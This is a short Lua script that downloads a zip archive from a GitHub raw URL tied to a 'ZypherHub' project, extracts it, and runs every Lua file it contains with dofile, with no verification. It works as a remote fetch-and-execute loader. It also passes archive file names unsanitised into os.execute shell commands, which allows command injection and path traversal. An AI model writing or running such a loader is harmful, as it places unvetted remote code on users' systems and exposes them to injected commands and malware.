local http = require("socket.http")
local ltn12 = require("ltn12")
local zip = require("zip")

function downloadFile(url, outputPath)
    local file = io.open(outputPath, "wb")
    if file then
        local response, status = http.request{
            url = url,
            sink = ltn12.sink.file(file)
        }
        if status == 200 then
            print("Download successful!")
        else
            print("Download failed. HTTP Status: " .. status)
        end
        file:close()
    else
        print("Error opening file for writing!")
    end
end

function extractZipAndExecute(zipFile, extractTo)
    local archive = zip.open(zipFile)
    if not archive then
        print("Error opening zip file!")
        return
    end

    for file in archive:files() do
        local filePath = extractTo .. "/" .. file.filename
        print("Extracting: " .. file.filename)

        local dirPath = filePath:match("^(.-)/")
        if dirPath then
            os.execute("mkdir -p " .. dirPath)
        end

        -- Extract the file
        local extractedFile = io.open(filePath, "wb")
        if extractedFile then
            extractedFile:write(file:read())
            extractedFile:close()
            print("Extraction complete for: " .. file.filename)

            if file.filename:match("%.lua$") then
                print("Executing: " .. file.filename)
                dofile(filePath)  -- Execute the Lua script
            end
        else
            print("Error extracting file: " .. file.filename)
        end
    end

    archive:close()
end

-- Main execution
local url = "https://github.com/ZypherHub/ZypherShit/raw/main/ZypherHub.zip" 
local downloadPath = "downloaded.zip" 
local extractPath = "extracted" 

downloadFile(url, downloadPath)

os.execute("mkdir " .. extractPath)

extractZipAndExecute(downloadPath, extractPath)